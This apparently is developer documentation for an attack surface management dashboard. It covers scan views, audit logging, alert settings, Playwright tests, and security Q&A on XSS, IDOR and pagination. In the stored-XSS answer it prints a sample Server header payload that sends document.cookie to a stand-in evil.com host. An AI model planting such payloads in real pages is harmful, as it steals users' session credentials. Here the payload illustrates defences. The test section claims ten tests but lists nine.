  Production containers and CI test runs build reproducible wheels via Docker. If an external CDN experiences an outage or unpublishes a release, external builds and runtime environments break. Vendored assets guarantee that Docker images build and run reliably in isolated or air-gapped network environments without external internet access.
- **4. Cryptographic Integrity via `VENDOR.md`:**
  Recording the exact package version, official upstream tarball URL, and cryptographic SHA-256 hash in `src/asm/static/vendor/VENDOR.md` establishes an immutable chain of custody. Any developer, auditor, or automated scanner can verify that the vendored `.js` files match the official upstream releases byte-for-byte without unauthorized modifications or backdoor injections.

---

# Part 10: Phase v3.4b — Scans List, Scan Detail, Fix First & Attack Surface Changes UI

## 1. Plain-English Code Walkthrough

### `src/asm/ui_views.py`
- **What it is:** Pure presentation logic, data formatting, and view-model extraction functions for the dashboard scans and results views.
- **Why it exists:** Keeps Jinja2 templates declarative and dumb, and keeps FastAPI route handlers clean of data munging and sorting heuristics.
- **Key Functions & Types:**
  - `FormattedFinding` & `FixFirstResult`: Immutable frozen dataclasses representing sanitized, sorted finding records ready for autoescaped template rendering.
  - `extract_fix_first_findings(score_report)`: Parses the score stage report JSON. Sorts findings by:
    1. Severity Tier: `CRITICAL` > `HIGH` > `MEDIUM` > `LOW` > `INFO`
    2. Score Points: Descending
    3. Host: Ascending (case-insensitive)
    4. Port: Ascending (`None` port precedes numeric ports)
    Caps findings at 50 for performance and renders `more_count = max(0, total - 50)`. Computes per-tier counts (`dict.fromkeys(TIER_ORDER, 0)`) across *all* parsed findings before the cap, guaranteeing count cards stay synchronized with the data regardless of the producer's internal dictionary keys.
  - `format_duration(started_at, finished_at)`: Formats execution duration into human-readable strings (`"--"`, `"In progress"`, `"45s"`, or `"2m 15s"`).
  - `format_change_summary(change_detection)`: Reads `scan_runs.change_detection` as produced by `worker.py`. Sums non-zero counts across the five tiers (`critical`, `high`, `medium`, `low`, `info`). Renders `"Baseline scan"` for baseline runs, `"No changes"` when total differences are zero, or a comma-separated breakdown (e.g. `"1 critical, 2 info"`).
  - `check_polling_status(status, created_at, now)`: Returns `(should_poll, is_stale_active)`. If status is `queued` or `running` and `(now - created_at) < 15 minutes`, `should_poll` is `True`. If active but $\ge 15$ minutes old, `should_poll` is `False` and `is_stale_active` is `True`. For all terminal states (`succeeded`, `failed`, `cancelled`), both are `False`.

### `src/asm/api/routes_ui.py` (New v3.4b Routes)
- **`GET /ui/orgs/{org_id}/domains/{domain_id}/scans`**:
  - Enforces authorization through `require_org_role("viewer")` and tenant domain choke point `get_domain_for_org(db, org_id, domain_id)`.
  - Queries the latest 20 scans for the domain ordered by `created_at DESC, id DESC`.
  - Strictly omits loading heavy `ScanResult` JSON reports for table rows, deriving summaries directly from `scan_runs.change_detection`.
  - Emits `Cache-Control: no-store` and CSP headers via `apply_security_headers`.
- **`GET /ui/orgs/{org_id}/scans/{scan_id}`**:
  - Enforces authorization through `require_org_role("viewer")` and tenant scan choke point `get_scan_for_org(db, org_id, scan_id)` (which joins `ScanRun` to `Domain` on `Domain.org_id == org_id`, returning 404 on cross-tenant access).
  - **IDOR Choke Point Rule:** Queries child `ScanResult` (stage `"score"`) and `ScanChange` entities strictly using `scan_run.id` from the resolved scan entity, never from request URL parameters.
  - Assembles normalized pipeline stage dictionaries for all 5 stages (`discover`, `probe`, `portscan`, `inspect`, `score`), populating execution status, duration, and errors.
  - Determines polling state via `check_polling_status(scan_run.status, scan_run.created_at)`.

### `src/asm/templates/partials/scans_list.html`
- **What it is:** Table fragment displaying the latest 20 scan executions for a domain.
- **Key Elements:**
  - Header with `"Back to domain"` navigation button.
  - Role-gated `"Run scan"` button (rendered only for `admin` and `owner` roles).
  - When domain is unverified, button is rendered `disabled` with visible text: `"Domain ownership verification required to run scans."`
  - Table with sentence-case headers: `"Scan ID"`, `"Trigger"`, `"Status"`, `"Started at"`, `"Duration"`, `"Changes"`, `"Actions"`.
  - Row action: `"View scan"` button triggering fragment navigation.
  - Footer banner: `"Showing the latest {{ scans_limit }} scans."` when row count reaches the limit (20).

### `src/asm/templates/partials/scan_detail.html`
- **What it is:** Complete inspection view for a single scan run, findings triage, and attack surface changes.
- **Key Elements:**
  - Root container: `<section class="surface-panel" id="scan-detail-container" ...>`. Emits `hx-get`, `hx-target="this"`, `hx-swap="outerHTML"`, and `hx-trigger="every 3s"` *only* when `should_poll` is true. Finished scans omit `hx-get` completely so clicks inside the panel never trigger unwanted re-fetches.
  - Stale warning banner (rendered when `is_stale_active` is true): `"Still <status> after 15 minutes. Automatic updates have stopped."` with a `"Refresh"` button.
  - 5-stage progress pipeline cards (`discover`, `probe`, `portscan`, `inspect`, `score`) with stage status badges, durations, and stage errors.
  - Error banner when `scan_run.error` is present: `"Scan failed:"` followed by the error message.
  - Fix first: Summary cards for `"Domain score"`, `"Risk band"`, `"Critical"`, `"High"`, `"Medium"`, `"Low"`. Table displaying findings sorted by severity tier, score points, host, and port. Capped at 50 rows with an overflow message: `"... and {{ fix_first.more_count }} more findings."`
  - Changes detected: Table displaying `ScanChange` records (`Severity`, `Category`, `Change type`, `Asset`, `Detail`, `Evidence`) or `"No changes detected in this scan."`
  - **Stored-XSS Guard:** All attacker-influenced finding and change strings are rendered strictly as autoescaped text within `<code>` or standard text elements, never within `<a href>`.

### `src/asm/static/js/app.js` (v3.4b Additions)
- **`btn-run-scan` Handler:** Intercepts click, disables button, sets text to `"Starting scan..."`, generates an idempotency key (`crypto.randomUUID()`), and dispatches an authenticated `POST /orgs/{org_id}/domains/{domain_id}/scans`. Handles 409 (already active) and 422 (unverified) using `showError` (via `textContent`), and navigates to the scan detail view on success.
- **Navigation Handlers:** Click delegation for `.btn-view-scans`, `.btn-view-scan`, `#btn-back-domain-detail`, `#btn-back-scans`, and `#btn-refresh-scan`.
- **401 Token Refresh Swap Preservation:** In `htmx:responseError`, the retry mechanism checks the source element's `hx-swap` attribute (`evt.detail.elt.getAttribute('hx-swap')`). If present (e.g. `outerHTML`), it passes `swap: swapStyle` to `htmx.ajax()`, preventing the default `innerHTML` swap from nesting a duplicate `<section>` inside the active container.

---

## 2. Five v3.4b Interview Questions & Answers

### Question 1: What are contract fixtures, why did 424 tests pass while Bugs O and P were present, and how do contract tests prevent UI/worker schema drift?
**Answer:**
- **Why 424 Tests Passed with Bugs O and P Present:**
  - Bug O: In `test_ui_views.py`, the score report fixture was handwritten with invented uppercase keys: `{"counts": {"CRITICAL": 1, "HIGH": 2}}`. The unit tests asserted that `counts["CRITICAL"]` matched the output. The tests passed because the mock fixture matched the mock expectation! In production, however, `scoring.py` produces `{"findings_critical": 1, "findings_high": 2}`. The real UI showed 0 for all count cards.
  - Bug P: In the scans list, the change detection mock used `{"counts": {"total": 3, "critical": 1, "high": 2}}`. The UI parser checked `counts.get("total")`. Again, test passed against mock. In production, `worker.py` writes counts as a dictionary of five individual tiers (`{"critical": 1, "high": 0, ...}`) with no `"total"` key. The real UI showed "No changes" for completed scans that had actual changes.
  - In both cases, unit tests tested isolated assumptions against synthetic data rather than the true output shape of the producer.
- **What Contract Fixtures Are:**
  Contract fixtures are test payloads generated directly by the real producer code (e.g., calling `ScoreReport(...).to_dict()` or the exact `change_detection` dict the worker writes) rather than handwriting dictionaries in test files.
- **How to Prevent UI/Worker Drift:**
  1. *Generate Fixtures from Domain Models:* Build test fixtures using the producer's real factory or dataclass methods. If the producer changes key names, the fixture generation code or consumer tests immediately fail at build time.
  2. *Schema Validation Tests:* Run JSON schema validation or Pydantic parsing over persisted stage reports and change payloads to guarantee producer and consumer share an identical contract.

---

### Question 2: In HTMX, why does an element with `hx-get` require an explicit `hx-trigger`, and how does omitting `hx-trigger` on a finished scan panel cause accidental re-fetching on click?
**Answer:**
- **HTMX Default Trigger Rules:**
  In HTMX, when an element specifies an AJAX request attribute (`hx-get`, `hx-post`, `hx-put`, `hx-delete`) without an accompanying `hx-trigger`, HTMX assigns a default trigger based on the element tag:
  - Form elements (`<form>`) default to `submit`.
  - Input, select, and textarea elements default to `change`.
  - Every other HTML element (including `<section>`, `<div>`, `<p>`, `<table>`) defaults to `click`!
- **The Accidental Re-Fetch Bug (Bug Q):**
  In early development, the scan detail container had:
  ```html
  <section id="scan-detail-container"
    hx-get="/ui/orgs/{{ org.id }}/scans/{{ scan_run.id }}"
    hx-target="this"
    hx-swap="outerHTML"
    {% if should_poll %}hx-trigger="every 3s"{% endif %}>
  ```
  While the scan was active (`should_poll = True`), `hx-trigger="every 3s"` was present, so HTMX polled every 3 seconds. Once the scan completed (`status = "succeeded"`), `should_poll` became `False`. The template omitted `hx-trigger`, but left `hx-get` on the `<section>`.
  Because `<section>` defaults to the `click` trigger, any click inside the completed panel (clicking text to select it, clicking a table row, clicking a code snippet) triggered a full HTTP GET and outerHTML swap!
- **The Rule for HTMX Templates:**
  Never emit `hx-get` without an explicit trigger if the element is not intended to be interactive. In `scan_detail.html`, all four polling attributes (`hx-get`, `hx-target`, `hx-swap`, `hx-trigger`) are wrapped in `{% if should_poll %}` so completed panels have zero AJAX attributes.

---

### Question 3: How can network scan evidence lead to stored Cross-Site Scripting (XSS), and what are the two layers of defense used to neutralize it in the dashboard?
**Answer:**
- **How Network Evidence Becomes a Stored XSS Vector:**
  An Attack Surface Management scanner inspects external, attacker-controlled infrastructure:
  1. *Externally sourced names:* subdomains come from third-party sources such as Certificate Transparency logs and are untrusted input. Discovery filters invalid hostnames (`_is_valid_discovered_name`), but the UI must not depend on that.
  2. *HTTP Server Headers & Titles:* An attacker's web server can return headers like `Server: <img src=x onerror=fetch('//evil.com/'+document.cookie)>` or `<title><script>...</script></title>`.
  3. *Port Banners:* An SSH or FTP daemon can output ANSI escape codes or raw HTML in its greeting banner.
  When the ASM worker stores these strings in `ScanResult` or `ScanChange` tables, and the web dashboard renders them for security analysts, those strings are stored XSS vectors. If rendered into the DOM unsanitized, the attacker's JavaScript executes in the context of the authenticated analyst's session.
- **Layer 1: Autoescaped Text in Standard Elements (No Links):**
  Jinja2 template autoescaping is enabled across all partials. Characters like `<`, `>`, `"`, and `'` are converted to HTML entities (`&lt;`, `&gt;`, `&#34;`, `&#39;`). Evidence strings are placed strictly inside `<code>{{ f.evidence }}</code>` or standard table cells.
  Critically, evidence is *never* converted into active links (`<a href="{{ f.evidence }}">`). Autoescaping inside an `href` attribute does not neutralize `javascript:...` or `data:...` URIs; clicking an escaped `href="javascript:..."` executes arbitrary code!
- **Layer 2: Defense-in-Depth via Strict Content Security Policy:**
  Even if an author inadvertently bypassed autoescaping (e.g. using `|safe`), the strict CSP (`default-src 'self'`, no `'unsafe-inline'`, no `'unsafe-eval'`) prevents inline scripts or script attributes from executing, and `connect-src 'self' <SUPABASE_URL>` limits script-driven requests (fetch/XHR) to the app's own origin and Supabase. It does not block every exfiltration path (for example top-level navigation), which is why escaping is the primary defence.

---

### Question 4: Why is live scan polling capped at 15 minutes, what failure modes does this mitigate, and how does the UI gracefully transition when the cap is reached?
**Answer:**
- **Why Infinite Polling is an Anti-Pattern:**
  If an active scan polls every 3 seconds indefinitely:
  1. *Worker Crashes / Stalled Jobs:* If a background worker pod crashes or hits an unhandled exception without updating `status = "failed"`, the scan remains in `running` state until lease recovery. An open browser tab would poll the database 1,200 times per hour indefinitely.
  2. *Zombie Tabs & Server Load:* Users frequently leave dashboard tabs open overnight or over weekends. With hundreds of users leaving tabs open, unconstrained polling generates unnecessary database read load and web server CPU consumption.
  3. *Client-Side Network Congestion:* Indefinite polling on mobile or metered connections wastes battery and bandwidth.
- **The 15-Minute Threshold:** A judgement call, not a measured percentile. It is long enough for a normal single-domain scan to finish while someone watches, and it bounds the load from a forgotten tab to at most 300 requests (one every 3 seconds for 15 minutes). No scan-duration data has been collected yet; revisit once real timings exist.
- **Graceful UI Transition:**
  The server calculates scan age via `check_polling_status(scan_run.status, scan_run.created_at)`. When `age >= 15 minutes`:
  - `should_poll` returns `False`, omitting `hx-trigger="every 3s"` from the rendered HTML. Polling stops automatically with zero client-side JavaScript timers.
  - `is_stale_active` returns `True`, rendering an accessible status banner:
    ```html
    <div class="banner-stale" role="status">
      <span>Still running after 15 minutes. Automatic updates have stopped.</span>
      <button type="button" id="btn-refresh-scan" class="btn btn-secondary btn-sm" ...>Refresh</button>
    </div>
    ```
  - The user can click `"Refresh"` to manually check current progress whenever desired.

---

### Question 5: When rendering `/ui/orgs/{org_id}/scans/{scan_id}`, why are the score `ScanResult` and `ScanChange` child rows loaded strictly via `scan_run.id` from `get_scan_for_org`, and what security vulnerability would occur if query parameters were used instead?
**Answer:**
- **The Security Invariant:**
  In `routes_ui.py`:
  ```python
  scan_run = get_scan_for_org(db, org_id, scan_id)
  
  # Load score report strictly using scan_run.id:
  score_result = db.scalars(
      select(ScanResult).where(
          ScanResult.scan_run_id == scan_run.id,
          ScanResult.stage == "score",
      )
  ).first()

  # Load changes strictly using scan_run.id:
  scan_changes = list(db.scalars(
      select(ScanChange).where(ScanChange.scan_run_id == scan_run.id)
  ).all())
  ```
- **The Vulnerability of Parameter-Driven Queries (IDOR / Parameter Swapping):**
  Suppose an endpoint accepted separate query parameters, e.g. `/scans/{scan_id}?result_id=123` or loaded child records from raw request variables without scoping to `scan_run.id`:
  - An attacker in Organization A could pass their own valid `scan_id`, but supply a `result_id` or `scan_run_id` belonging to a confidential scan in Organization B.
  - If the database query filtered on the child ID without enforcing `ScanResult.scan_run_id == scan_run.id`, the server would return Organization B's vulnerability findings and attack surface delta inside Organization A's dashboard view.
- **Choke Point Chaining:**
  `get_scan_for_org` verifies both that the scan exists AND that `Domain.org_id == org_id`. If either condition fails, it raises an anti-enumeration HTTP 404. By chaining all subsequent database queries strictly off the verified `scan_run.id` returned by the choke point, cross-tenant data leaks and parameter-tampering attacks are structurally eliminated.

---

# Part 11: Phase v3.4c — Schedule Settings, Alert Settings, Alert History & Audit Log UI

## 1. Plain-English Code Walkthrough & Architecture

### `src/asm/audit.py` (`build_audit_query`)
- **What it is:** A centralized SQLAlchemy query constructor for `AuditEvent` records, shared by the JSON API and UI routes.
- **Why it exists:** Prevents query drift between the JSON API (`GET /orgs/{org_id}/audit-events`) and the UI fragment (`GET /ui/orgs/{org_id}/audit-events`). If filtering logic, tenant isolation, or ordering were duplicated across two files, changes to one could accidentally leave the other vulnerable to cross-tenant exposure or inconsistent sorting.
- **Key Parameters & Invariants:**
  - `org_id`: Enforces tenant boundary (`AuditEvent.org_id == org_id`).
  - `domain_id`: Optional target domain filter (`AuditEvent.target_type == "domain"`, `AuditEvent.target_id == str(domain_id)`).
  - `action`: Optional action filter (`AuditEvent.action == action`).
  - `limit`: Result count bound (default 50).
  - `before_id`: Keyset pagination cursor (`AuditEvent.id < before_id`).
  - `include_user`: When true, performs an outer join with `User` (`select(AuditEvent, User.email).outerjoin(User, AuditEvent.actor_user_id == User.id)`), allowing the UI to display the actor's email address alongside user-initiated actions without N+1 queries.
  - Sorting: Always orders by `AuditEvent.id.desc()`.
  - Top-level imports: `from asm.db.models import AuditEvent, User`.

### `src/asm/api/routes_ui.py` (v3.4c Endpoints)
- **Domain Detail Enhancement (`GET /ui/orgs/{org_id}/domains/{domain_id}`):**
  - Passes schedule interval, `next_scan_at`, and email alert configuration into the template context.
  - Viewers receive read-only status indicators; mutation forms are rendered for `admin` and `owner` roles.
- **Domain Alert History (`GET /ui/orgs/{org_id}/domains/{domain_id}/alert-notifications`):**
  - Protected by role gate `require_org_role("viewer")` and tenant choke point `get_domain_for_org(db, org_id, domain_id)`.
  - Queries `AlertNotification` rows for the domain ordered by `created_at DESC, id DESC` (same as the JSON API) with offset pagination (`offset` and `limit=50`).
  - Computes pagination flags: `has_prev = offset > 0`, `has_next = len(notifications) == limit`, `prev_offset = max(0, offset - limit)`, `next_offset = offset + limit`.
- **Organization Audit Log (`GET /ui/orgs/{org_id}/audit-events`):**
  - Protected by role gate `require_org_role("admin")` (admin/owner only; viewer receives 403, non-member receives 404).
  - Normalizes empty action string (`action if action and action.strip() else None`) to prevent empty string matches against action names.
  - Calls `build_audit_query` with `include_user=True` and `limit=50`.
  - Serializes `event.metadata_` using Python's standard `json.dumps(event.metadata_, indent=2, sort_keys=True, ensure_ascii=False)` into a plain string `metadata_json`.
  - Resolves `oldest_id = events_data[-1]["event"].id` when the page is full (50 events) to provide the `before_id` cursor for keyset pagination.

### Templates (`partials/domain_detail.html`, `partials/alert_notifications.html`, `partials/audit_events.html`)
- **`domain_detail.html` (Schedule & Alerts):**
  - Schedule Section: Shows current cadence and next scan timestamp. Admin form renders `<select>` with options `Off`, `Every 6 hours`, `Every 12 hours`, `Every 24 hours`, `Every 7 days`, `Every 30 days`, plus `Every N hours (current)` for custom intervals. Unverified domains keep `Off` enabled while disabling active presets with hint text: `"Domain ownership verification required before scheduling automated scans."`
  - Alerts Section: Shows `"Alert status"` (`Alerts: enabled` or `Alerts: disabled` neutral badge with class `status-skipped`), `"Minimum severity:"`, and `"Configured recipients:"` (`"N recipients configured"`). Admin form provides an enable toggle, severity select, and email chips. On unverified domains, alerts cannot be enabled (`"Domain ownership verification required before enabling alerts."`), but can be disabled.
- **`alert_notifications.html` (Alert History):**
  - Outbox log displaying `Created`, `Sent`, `Recipient`, `Subject`, `Status`, `Attempts`, `Last error`, and `Body`.
  - Privacy Guard: The `Recipient` and `Last error` columns are rendered only if `user_role in ('admin', 'owner')`. Viewers never receive recipient email strings or raw SMTP error details.
  - Status Badges: Sent (`status-verified`), Pending (`status-pending`), Failed (`status-failed`).
  - Message body rendered within collapsible `<details class="alert-body-details"><summary>View message body</summary><pre class="code-block"><code>{{ n.body }}</code></pre></details>`.
- **`audit_events.html` (Audit Log):**
  - Filter bar with action select (`All actions` and 15 sorted lifecycle actions) and domain select (`All domains`).
  - Table displaying `Time`, `Actor`, `Action`, `Target`, and `Metadata`.
  - Keyset pagination with `"Older events"` (attaching `data-before-id="{{ oldest_id }}"`) and `"Newest"`.
  - Escaped JSON metadata: Rendered as `{{ item.metadata_json }}` inside `<pre><code>`.

### `src/asm/static/js/app.js` (v3.4c Handlers)
- **Schedule save:** on submit of `#schedule-settings-form`, reads the
  `interval_hours` select ("" becomes `null`, otherwise an integer) and calls
  `authenticatedFetch('/orgs/{org_id}/domains/{domain_id}/schedule', { method: 'PUT', ... })`.
  Errors are shown with `showError(formatErrorMessage(...))`; on success
  `loadDomainDetail()` re-renders the panel.
- **Alerts save:** on submit of `#alerts-settings-form`, collects the chip texts
  (`#alert-emails-list .email-chip-text`), the checkbox and the severity select, then
  sends `PUT .../alerts` the same way.
- **Email chips:** added only with the "Add email" button (`#btn-add-alert-email`):
  the value is trimmed and validated; case-insensitive duplicates and more than 5
  entries are rejected; the chip is built with `createElement` and `textContent`.
  "Remove" deletes the chip element.
- **Alert history paging:** `.btn-page-alert-notifications` buttons pass
  `data-offset` to `loadAlertNotifications()`, which loads
  `/ui/.../alert-notifications?offset=N` into `#main-content-area` with `htmx.ajax`.
- **Audit log:** `loadAuditLog()` builds the query string from non-empty `action`,
  `domain_id` and `before_id` values only, and loads it into `#main-content-area`.
  The filter form, "Older events" (`data-before-id`) and "Newest" all call it.

---

## 2. Five v3.4c Security & Architecture Interview Questions & Answers

### Question 1: Why does Jinja2's built-in `tojson` filter bypass autoescape, why was that a security hazard for audit metadata, and how is untrusted JSON rendered safely?
**Answer:**
- **Why `tojson` Bypasses Autoescape:**
  In Jinja2, the `tojson` filter is implemented by dumping an object to JSON and wrapping the resulting string in `markupsafe.Markup`. In Jinja's architecture, any object of type `Markup` is considered pre-sanitized by the developer. The autoescape engine explicitly checks `isinstance(val, Markup)`; if true, it injects the string verbatim without HTML-entity escaping (`&`, `<`, `>`, `"`, `'`).
- **The Hazardous Assumption:**
  The `tojson` filter was originally designed for embedding data inside JavaScript `<script>` blocks (e.g. `<script>let data = {{ data|tojson }};</script>`), where it escapes `<` as the Unicode escape sequence `\u003c` to prevent closing `</script>` tags. However, if rendered inside HTML body markup (such as `<pre><code>{{ data|tojson }}</code></pre>`), the browser treats it as HTML text. While `\u003c` prevents raw tag opening, relying on `Markup`-wrapped JSON in HTML templates is brittle and bypasses the fundamental autoescape guarantee. If any serializer variation or sub-filter does not escape HTML characters, XSS occurs.
- **The Safe Pattern:**
  Serialize the data in Python using the standard library `json.dumps(metadata, indent=2, sort_keys=True, ensure_ascii=False)`. Pass the resulting plain `str` into the template context. In Jinja, standard string variables rendered via `{{ metadata_json }}` undergo standard HTML autoescaping:
  - `<` becomes `&lt;`
  - `>` becomes `&gt;`
  - `&` becomes `&amp;`
  - `"` becomes `&#34;`
- **Static Template Guard:**
  To guarantee this rule is never broken, the project enforces a template guard test (`test_templates_have_no_csp_blocked_inline_code`) that statically inspects all Jinja2 files and fails the build if `tojson` or `|safe` appears anywhere in template source code.

---

### Question 2: In multi-tenant web applications, why must role-based authorization checks and resource-scoping choke points be tested separately (non-member vs parameter swap)?
**Answer:**
- **Two Distinct Layers of Defense:**
  Multi-tenant security relies on two independent layers:
  1. *Layer 1 (Role Authorization):* Validates that the caller is an authenticated member of the organization identified in the URL (`/orgs/{org_id}/...`) with an adequate role (`viewer`, `admin`, `owner`).
  2. *Layer 2 (Resource Scoping / Choke Point):* Validates that the target resource (e.g. `domain_id`, `scan_id`) actually belongs to the caller's organization, not a different tenant.
- **The Non-Member Test Flaw:**
  If a test only verifies that a non-member cannot access `/ui/orgs/{org_a}/domains/{domain_b}/alert-notifications`, the test is stopped at Layer 1 (`require_org_role` raises 404 because the caller has no membership in `org_a`). This test never exercises Layer 2. If Layer 2 had a critical bug (e.g. querying `Domain.id == domain_id` without filtering on `Domain.org_id == org_id`), the non-member test would still pass!
- **The Parameter Swap Test (IDOR):**
  To test Layer 2, the test caller must be a fully authorized member (such as `owner`) of `org_a`, but pass the ID of a domain belonging to `org_b` (`/ui/orgs/{org_a}/domains/{domain_b}/alert-notifications`). Here, Layer 1 passes cleanly. The request reaches the resource choke point (`get_domain_for_org`). If the choke point correctly asserts `domain.org_id == org_a`, it raises an anti-enumeration 404. Testing both scenarios independently guarantees that both defense layers are functional.

---

### Question 3: What is the difference between UI-only data redaction and API-layer data redaction, what threat models does UI-only redaction protect against, and what does it leave exposed?
**Answer:**
- **What UI-Only Redaction Is:**
  In v3.4c, redaction of recipient email addresses and raw SMTP errors is implemented in the presentation layer: Jinja2 templates (`alert_notifications.html`, `domain_detail.html`) omit email strings when `user_role == 'viewer'`, rendering only the recipient count (`"2 recipients configured"`). The underlying JSON API (`DomainRead`, `GET /alert-notifications`), however, continues to return the email addresses to authenticated viewers.
- **Threat Models Protected by UI-Only Redaction:**
  1. *Shoulder Surfing & Screen Sharing:* In enterprise operations, junior analysts or viewers often share screens or present dashboards during meetings. Hiding sensitive email addresses from the browser view prevents accidental visual disclosure.
  2. *Casual Inspection & Screenshots:* Prevents PII from appearing in screenshots, exports, or casual DOM inspection.
- **What UI-Only Redaction Leaves Exposed:**
  Because the backend JSON API still serializes `alert_emails` and `recipient` to any caller with the `viewer` role, a knowledgeable viewer can open browser developer tools, inspect API network responses, or query the API directly using their Bearer token to read the unredacted email addresses.
- **Why It Was Scoped This Way:**
  Modifying API contracts risks breaking external API integrations and automated scripts. API-layer redaction was deferred to a future API version (tracked in `IDEAS.md`). However, defense-in-depth requires documenting this boundary clearly so developers and security auditors do not mistakenly assume the API is private.

---

### Question 4: When designing pagination for web applications, what are the architectural criteria for choosing keyset cursor pagination versus offset pagination?
**Answer:**
- **Keyset Cursor Pagination (Chosen for Audit Log):**
  - *Mechanism:* Queries use an indexed sequential column and inequality operator: `WHERE org_id = :org_id AND id < :before_id ORDER BY id DESC LIMIT :limit`.
  - *Best Fit:* High-volume, append-only event streams (such as audit logs, system telemetry, and transaction ledgers).
  - *Performance:* $O(\log N)$ B-tree index seek regardless of page depth. Page 1,000 executes as fast as Page 1.
  - *Stability:* Immune to row shifting. If new audit events are logged while a user inspects a page, the cursor (`before_id`) ensures the next page contains only events created before that record, avoiding duplicate or skipped items.
  - *Trade-off:* Does not support random page jumping (e.g. "Jump to page 47"); users can only navigate sequentially forward (`before_id`) or reset to newest.
- **Offset Pagination (Chosen for Alert History):**
  - *Mechanism:* Queries use `OFFSET :offset LIMIT :limit`.
  - *Best Fit:* Low-to-moderate volume entity lists scoped to a single parent entity (e.g. alert notifications for a specific domain, where the number of rows per domain is expected to stay small (not yet measured)).
  - *Usability:* Supports direct bidirectional offsets (`offset=0`, `offset=50`, `offset=100`), enabling simple Next and Previous controls with deterministic offset math (`offset - limit`, `offset + limit`).
  - *Trade-off:* $O(N)$ scanning cost on deep pages, and vulnerable to row drift if rows are inserted or deleted while paginating. This is acceptable while per-domain history stays small; revisit if it grows.

---

### Question 5: In security-critical state machines, why should "turning things off" remain permissible even when an entity is in an unverified or lapsed state (Decision A)?
**Answer:**
- **The Fail-Safe Direction (Principle of Safe State):**
  In systems engineering, when an entity loses trust (such as a domain whose ownership verification lapses or fails DNS re-checks), the system must prevent active operations (automated network reconnaissance scans, outbound alert emails). However, administrative actions fall into two opposing directions:
  1. *Activating / Continuing Operations:* Enabling alerts, scheduling recurring scans, triggering on-demand scans.
  2. *Deactivating / Revoking Operations:* Disabling alerts, removing alert recipients, turning off scan schedules.
- **The Hazard of Rigid Validation (The "Lock-In" Anti-Pattern):**
  Prior to Decision A, `PUT .../alerts` rejected any request on an unverified domain with `422 Unprocessable Content`. If a domain's verification lapsed while email alerts were active, an administrator attempting to turn alerts off or remove a compromised recipient's email address received an error: the API refused to let them turn it off until they re-verified the domain!
- **Decision A Resolution:**
  The validation rule was refined:
  - If `alerts_enabled == True`, verification is strictly required (returns 422 if unverified).
  - If `alerts_enabled == False`, the request is permitted regardless of verification status.
  This allows administrators to clear recipients, disable outbound notifications, and set scan schedules to `Off` without being blocked by verification checks. Systems must always facilitate transitioning toward a more secure, inert state.

---

# Part 12: Phase v3.4d — Playwright Browser Tests

## 1. Plain-English Code Walkthrough

### `tests/browser/conftest.py`
- **What it is:** The shared pytest configuration and fixture hub for end-to-end browser tests.
- **Why it exists:** Browser tests require orchestrating multiple layers: a real PostgreSQL test database, an in-process live HTTP server, Chromium browser instances, synthetic authentication routing, and strict runtime health assertions.
- **Key Fixtures:**
  - `forbid_real_dns (autouse=True)`: Patches `asm.api.routes.check_dns_txt_verification` to raise `AssertionError("real DNS lookup attempted in a browser test")`. Ensures tests remain hermetic and never leak outbound DNS traffic.
  - `configure_browser_auth_settings (autouse=True)`: Patches environment variables `SUPABASE_URL="https://auth.test-asm.local"` and `SUPABASE_PUBLISHABLE_KEY="sb_publishable_test"`, resetting auth dependencies before and after each test.
  - `browser_session_factory`: Sessionmaker bound to `db_engine` with `expire_on_commit=False` for multi-threaded access.
  - `override_db_and_auth`: Overrides FastAPI's `get_db` to yield fresh sessions from `browser_session_factory`, and overrides `get_current_user` to validate incoming Bearer tokens against `TOKEN_REGISTRY` in memory.
  - `live_server`: Starts Uvicorn inside a daemon thread bound to `127.0.0.1:0` (ephemeral port), shares the FastAPI `app` in-process, polls until started, yields the base URL, and shuts down cleanly after test completion.
  - `page`: Launches Chromium via `sync_playwright()`, initializes tracing and CSP violation listeners (`window.__cspViolations`), intercepts network routes via `page.route("**", ...)` (mocking Supabase auth grants and blocking external egress), monitors console errors and server response status codes, and executes teardown assertions (asserting zero CSP violations, zero console errors, zero page errors, zero 5xx or non-favicon 404 responses, and zero aborted external requests).

### `tests/browser/helpers.py`
- **What it is:** Helper utilities and synthetic token registries decoupled from test fixtures.
- **Why it exists:** Avoids importing directly from `conftest.py` (which violates pytest conventions) while centralizing authentication state and browser interaction helpers.
- **Key Functions and Registries:**
  - `TOKEN_REGISTRY`: In-memory dictionary mapping synthetic `access_token` strings to `user.id` UUIDs.
  - `REFRESH_REGISTRY`: In-memory dictionary mapping synthetic `refresh_token` strings to `user.id` UUIDs.
  - `make_fake_jwt(user: User) -> str`: Builds a base64url-encoded, JWT-shaped string (`header.payload.synthetic_signature`) with HS256 algorithm and registers it in `TOKEN_REGISTRY`.
  - `sign_in(page: Page, email: str, base_url: str) -> None`: Automates navigating to `/app`, filling `#signin-email` and `#signin-password`, clicking submit, and waiting for `#app-shell` visibility.

### `tests/browser/test_dashboard_browser.py`
- **What it is:** The 10 Playwright Chromium browser tests marked with `@pytest.mark.browser`.
- **Why it exists:** Exercises behaviors that cannot be validated via server-rendered HTML unit tests: real DOM event dispatch, live HTMX outerHTML swaps, runtime CSP evaluation, JavaScript event loops, and multi-step state changes.
- **The 10 Tests:**
  1. `test_browser_signin_and_domain_inventory`: Signs in as owner, checks `#app-shell` and domain cards, asserts zero CSP violations.
  2. `test_browser_viewer_rbac_privacy`: Verifies viewer role sees recipient count, write forms are omitted, and recipient emails do not appear in the DOM or alert history table.
  3. `test_browser_schedule_unverified_domain`: Confirms only "Off" is enabled on unverified domains, warning notice is visible, and saving persists.
  4. `test_browser_email_chips_interaction`: Tests adding chips, removing chips, rejecting case-insensitive duplicates, and enforcing the 5-chip cap with error banner.
  5. `test_browser_alerts_save_decision_a`: Tests Decision A on unverified domains: enabling alerts fails with 422, while disabling alerts succeeds and renders "Alerts: disabled".
  6. `test_browser_scan_detail_polling_lifecycle`: Tests scan polling with `hx-trigger="every 3s"`, auto-refreshing until status reaches succeeded, and removing polling attributes.
  7. `test_browser_401_retry_preserves_single_container`: Intercepts scan route to return 401 once, records headers, updates scan to succeeded, awaits Succeeded badge, asserts exactly 1 `#scan-detail-container` without nesting, and verifies refresh token header replacement.
  8. `test_browser_audit_log_filters_and_paging`: Seeds 55 audit events, checks 50 on page 1, navigates to page 2 (5 events) via "Older events", resets to page 1 via "Newest", and verifies action filtering.
  9. `test_browser_production_app_rejects_fake_token_401`: Verifies that if `get_current_user` override is removed, the production verifier rejects synthetic test tokens with HTTP 401.
